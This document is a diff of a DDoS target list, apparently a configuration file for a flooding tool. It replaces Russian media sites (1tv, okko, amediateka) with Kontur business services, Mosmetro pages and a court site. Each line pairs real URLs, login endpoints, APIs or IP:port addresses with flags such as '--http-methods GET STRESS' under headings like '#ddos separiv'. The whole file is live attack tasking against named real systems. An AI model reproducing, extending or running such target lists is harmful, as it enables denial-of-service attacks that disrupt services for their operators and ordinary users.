@@ -1,7 +1,9 @@
 #zhnec
 
-https://wink.ru --http-methods GET STRESS
-tcp://212.193.155.253:80 tcp://212.193.155.253:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 tcp://212.193.153.139:443 tcp://87.226.155.212:80 tcp://87.226.155.212:443
+https://e-kontur.ru/ https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://install.kontur.ru/ https://kontur.ru/ --http-methods GET STRESS
+https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://zakupki.kontur.ru/ https://pf.kontur.ru/ https://help.kontur.ru/ --http-methods GET STRESS
+https://focus.kontur.ru/ https://focus-api.kontur.ru/ https://ff.kontur.ru/ https://elbank.kontur.ru/ https://www.b-kontur.ru/ --http-methods GET STRESS
+https://developer.kontur.ru/ https://evrika.kontur.ru/ https://cabinet.kontur.ru/ https://ca.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS
 
 #gaidamaky
 http://beriev.com http://be-200.com http://iktport.ru http://dev-iktport.ru http://hotel.iktport.ru http://booking.iktport.ru --http-methods STRESS
@@ -10,8 +12,8 @@ tcp://195.206.41.118:1724 tcp://195.206.41.118:8880 tcp://89.223.123.192:22 tcp:
 tcp://193.104.87.38:443 tcp://185.184.79.149:22 tcp://185.184.79.149:443
 
 #ddos separiv
-https://okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv https://www.ontvtime.ru http://m.kino-teatr.ru/ --http-methods GET STRESS
-https://www.amediateka.ru https://kodiki.amediateka.ru/ https://rt.amediateka.ru/ https://akado.amediateka.ru/ --http-methods GET STRESS
-https://wink.ru https://www.1tv.ru/live https://cm.1tv.ru/ https://tlxmob.1tv.ru/ https://mt.kino-teatr.ru/ --http-methods GET STRESS
-https://25.1tv.ru/ https://kino.1tv.ru/ https://users.1tv.ru/ http://edu.1tv.ru/ --http-methods GET STRESS
-https://admin.kino.1tv.ru/ https://stage.1tv.ru/ https://subscr.1tv.ru/ https://kino-teatr.ru --http-methods GET STRESS
+
+http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru --http-methods GET STRESS
+https://shop.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ --http-methods GET STRESS  
+https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS 
+https://evrika.kontur.ru https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://edi-api.kontur.ru --http-methods GET STRESS
